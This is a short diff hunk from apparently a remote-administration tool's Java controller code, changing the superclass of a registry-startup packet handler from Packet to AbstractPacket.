@@ -6,7 +6,7 @@ import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlRegStart;
 
 
-public class PacketREGSTART extends Packet {
+public class PacketREGSTART extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
